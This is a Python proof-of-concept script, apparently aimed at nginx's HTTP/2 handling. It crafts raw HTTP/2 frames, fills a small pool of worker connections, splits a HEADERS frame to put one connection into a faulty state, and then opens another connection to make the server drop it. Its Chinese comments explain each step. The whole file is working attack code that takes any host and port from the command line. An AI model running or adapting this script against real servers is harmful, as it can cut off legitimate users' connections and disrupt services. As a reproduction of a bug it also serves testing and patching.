import socket, struct, sys, time, threading

def fr(t,f,sid,p=b""):
    return struct.pack(">I",len(p))[1:]+bytes([t,f])+struct.pack(">I",sid)+p
PREFACE=b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
HP=bytes([0x82,0x86,0x44,0x05])+b"/slow"+bytes([0x41,0x09])+b"localhost"
HEADERS=fr(0x1,0x5,1,HP)

def conn(host,port,t=5):
    s=socket.create_connection((host,port),timeout=t)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.sendall(PREFACE+fr(0x4,0,0))
    return s

def keep_reading(s, stop):
    def loop():
        s.settimeout(0.05)
        while not stop[0]:
            try:
                if not s.recv(65535): return
            except socket.timeout: continue
            except Exception: return
    threading.Thread(target=loop,daemon=True).start()

host,port=sys.argv[1],int(sys.argv[2])
stop=[False]
# 1) 占满槽位（worker_connections=4）
fillers=[]
for i in range(3):
    f=conn(host,port); keep_reading(f,stop); fillers.append(f)
time.sleep(0.5)
# 2) 目标连接进入 bug 状态
s=conn(host,port); keep_reading(s,stop)
time.sleep(0.4)
s.sendall(HEADERS[:1])
time.sleep(0.3)
s.sendall(HEADERS[1:])
time.sleep(0.2)
# 3) 第 4 个连接触发 accept -> ngx_get_connection -> drain（队列尾=目标）
try:
    t=conn(host,port); keep_reading(t,stop)
except Exception as e:
    print("trigger conn err", e)
time.sleep(1.0)
# 观察目标连接是否被关闭
s.settimeout(0.3); closed=False
for _ in range(6):
    try:
        d=s.recv(65535)
        if not d: closed=True; break
    except socket.timeout: continue
    except Exception: closed=True; break
print("target closed by drain:", closed)
stop[0]=True
for x in fillers+[s]:
    try: x.close()
    except Exception: pass
